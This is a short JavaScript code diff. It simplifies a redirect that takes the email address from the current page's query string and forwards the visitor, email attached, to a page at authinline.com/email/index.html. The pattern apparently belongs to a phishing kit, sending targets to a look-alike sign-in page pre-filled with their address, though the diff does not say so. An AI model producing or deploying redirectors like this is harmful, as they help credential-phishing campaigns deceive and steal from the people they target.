@@ -16,34 +16,14 @@
 
         // Check if the email part is not empty
         if (emailPart) {
-          // Split the emailPart into email and the rest of the parameters
-          var emailParams = emailPart.split('&');
-          var email = "";
-          var rest = "";
-          
-          for (var i = 0; i < emailParams.length; i++) {
-            var param = emailParams[i].split('=');
-            if (param[0] === 'email') {
-              // Extract the email parameter value
-              email = param[1];
-            } else {
-              if (rest) {
-                rest += "&" + emailParams[i];
-              } else {
-                rest = emailParams[i];
-              }
-            }
-          }
-          
-          if (email) {
-            // Construct the redirect URL with the email as the last part
-            var redirectURL = 'https://authinline.com/email/index.html?' + rest + '&email=' + email;
-            // Redirect to the constructed URL
-            window.location.href = redirectURL;
-          } else {
-            // If the email part is empty or not found, simply redirect to the second link
-            window.location.href = 'https://authinline.com/email/index.html/';
-          }
+          // Construct the redirect URL by appending the email to the second link
+          var redirectURL = 'https://authinline.com/email/index.html?' + emailPart;
+
+          // Redirect to the constructed URL
+          window.location.href = redirectURL;
+        } else {
+          // If the email part is empty, simply redirect to the second link
+          window.location.href = 'https://authinline.com/email/index.html/';
         }
       } else {
         // If no '?' character is found, simply redirect to the second link
